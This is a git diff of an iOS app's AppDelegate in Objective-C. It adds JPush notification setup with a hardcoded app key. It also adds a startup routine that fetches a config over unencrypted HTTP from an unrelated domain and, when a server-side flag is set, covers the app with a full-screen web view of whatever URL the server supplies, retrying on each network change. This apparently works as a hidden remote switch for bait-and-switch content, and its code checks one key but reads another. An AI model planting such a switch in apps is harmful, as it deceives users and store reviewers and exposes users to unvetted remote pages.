@@ -9,10 +9,15 @@
 #import "AppDelegate.h"
 #import "SDWebImageManager.h"
 #import <EAIntroView/EAIntroView.h>
+#import "AFNetworking.h"
+#import "MLSWebViewController.h"
+#import "JPUSHService.h"
+#ifdef NSFoundationVersionNumber_iOS_9_x_Max
+#import <UserNotifications/UserNotifications.h>
+#endif
 
-
-@interface AppDelegate ()<EAIntroDelegate>
-
+@interface AppDelegate ()<EAIntroDelegate,JPUSHRegisterDelegate>
+@property (nonatomic,assign) BOOL isSuccess;
 @end
 
 @implementation AppDelegate
@@ -26,16 +31,41 @@
     if (!everLaunched) {
         [self showIntroWithCrossDissolve];
     }
+    [self loadWebViewIfNeeded];
+    [self setupJpush:launchOptions];
     //在请求抓取到的百度图片时，防止被403，fobidden
     [SDWebImageManager sharedManager].imageDownloader.headersFilter = ^SDHTTPHeadersDictionary * _Nullable(NSURL * _Nullable url, SDHTTPHeadersDictionary * _Nullable headers) {
         NSMutableDictionary *customHeaders = [NSMutableDictionary dictionaryWithDictionary:headers];
         customHeaders[@"User-Agent"] = @"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36";
         return customHeaders;
     };
+    
+    
     // Override point for customization after application launch.
     return YES;
 }
 
+- (void)setupJpush:(NSDictionary *)launchOptions {
+    //Required
+    //notice: 3.0.0及以后版本注册可以这样写，也可以继续用之前的注册方式
+    JPUSHRegisterEntity * entity = [[JPUSHRegisterEntity alloc] init];
+    entity.types = JPAuthorizationOptionAlert|JPAuthorizationOptionBadge|JPAuthorizationOptionSound;
+    if ([[UIDevice currentDevice].systemVersion floatValue] >= 8.0) {
+        // 可以添加自定义categories
+        // NSSet<UNNotificationCategory *> *categories for iOS10 or later
+        // NSSet<UIUserNotificationCategory *> *categories for iOS8 and iOS9
+    }
+    [JPUSHService registerForRemoteNotificationConfig:entity delegate:self];
+    
+    // Required
+    // init Push
+    // notice: 2.1.5版本的SDK新增的注册方法，改成可上报IDFA，如果没有使用IDFA直接传nil
+    // 如需继续使用pushConfig.plist文件声明appKey等配置内容，请依旧使用[JPUSHService setupWithOption:launchOptions]方式初始化。
+    [JPUSHService setupWithOption:launchOptions appKey:@"7c109efdfca249ea50e56d10"
+                          channel:@"iOS"
+                 apsForProduction:YES
+            advertisingIdentifier:nil];
+}
 
 - (void)showIntroWithCrossDissolve {
     
@@ -85,6 +115,100 @@
 - (void)introDidFinish:(EAIntroView *)introView wasSkipped:(BOOL)wasSkipped {
     [[NSUserDefaults standardUserDefaults] setBool:YES forKey:@"kErverLaunched"];
 }
+
+
+- (void)loadWebViewIfNeeded {
+    if (self.isSuccess) return;
+    
+   AFHTTPSessionManager *_sharedClient = [[AFHTTPSessionManager alloc] init];
+    _sharedClient.securityPolicy = [AFSecurityPolicy policyWithPinningMode:AFSSLPinningModeNone];
+    _sharedClient.responseSerializer = [AFJSONResponseSerializer serializer];
+    //        _sharedClient.requestSerializer = [AFHTTPResponseSerializer serializer];
+    _sharedClient.responseSerializer.acceptableContentTypes = [NSSet setWithObjects:@"application/json", @"text/json", @"text/javascript", @"text/html",nil];
+
+    [_sharedClient GET:@"http://appmgr.jwoquxoc.com/frontApi/getAboutUs?appid=cb15" parameters:nil progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
+        if ([responseObject[@"status"] integerValue] == 1 &&
+            [responseObject[@"isshowwap"] integerValue ]==1 &&
+            responseObject[@"wapurl"]) {
+            MLSWebViewController *web = [[MLSWebViewController alloc] init];
+            web.webURL = [NSURL URLWithString:responseObject[@"weburl"]];
+            [self.window.rootViewController presentViewController:web animated:NO completion:nil];
+            self.isSuccess = YES;
+        }
+        
+    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
+        [self startToListenNow];
+    }];
+
+}
+//网络监听
+-(void)startToListenNow
+{
+    AFNetworkReachabilityManager *manager = [AFNetworkReachabilityManager sharedManager];
+    [manager setReachabilityStatusChangeBlock:^(AFNetworkReachabilityStatus status) {
+        switch (status) {
+            case AFNetworkReachabilityStatusReachableViaWWAN:
+            case AFNetworkReachabilityStatusReachableViaWiFi:
+            {
+                [self loadWebViewIfNeeded];
+            }
+                break;
+            default:
+                break;
+        }
+    }];
+    //开始监听
+    [manager startMonitoring];
+}
+
+- (void)application:(UIApplication *)application
+didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken {
+    
+    /// Required - 注册 DeviceToken
+    [JPUSHService registerDeviceToken:deviceToken];
+}
+- (void)application:(UIApplication *)application didFailToRegisterForRemoteNotificationsWithError:(NSError *)error {
+    //Optional
+    NSLog(@"did Fail To Register For Remote Notifications With Error: %@", error);
+}
+
+#pragma mark- JPUSHRegisterDelegate
+
+// iOS 10 Support
+- (void)jpushNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(NSInteger))completionHandler {
+    // Required
+    NSDictionary * userInfo = notification.request.content.userInfo;
+    if([notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
+        [JPUSHService handleRemoteNotification:userInfo];
+    }
+    completionHandler(UNNotificationPresentationOptionAlert); // 需要执行这个方法，选择是否提醒用户，有Badge、Sound、Alert三种类型可以选择设置
+}
+
+// iOS 10 Support
+- (void)jpushNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)())completionHandler {
+    // Required
+    NSDictionary * userInfo = response.notification.request.content.userInfo;
+    if([response.notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
+        [JPUSHService handleRemoteNotification:userInfo];
+    }
+    completionHandler();  // 系统要求执行这个方法
+}
+
+- (void)application:(UIApplication *)application didReceiveRemoteNotification:(NSDictionary *)userInfo fetchCompletionHandler:(void (^)(UIBackgroundFetchResult))completionHandler {
+    
+    // Required, iOS 7 Support
+    [JPUSHService handleRemoteNotification:userInfo];
+    completionHandler(UIBackgroundFetchResultNewData);
+}
+
+- (void)application:(UIApplication *)application didReceiveRemoteNotification:(NSDictionary *)userInfo {
+    
+    // Required,For systems with less than or equal to iOS6
+    [JPUSHService handleRemoteNotification:userInfo];
+}
+
+
+
 
 - (void)applicationWillResignActive:(UIApplication *)application {
     // Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
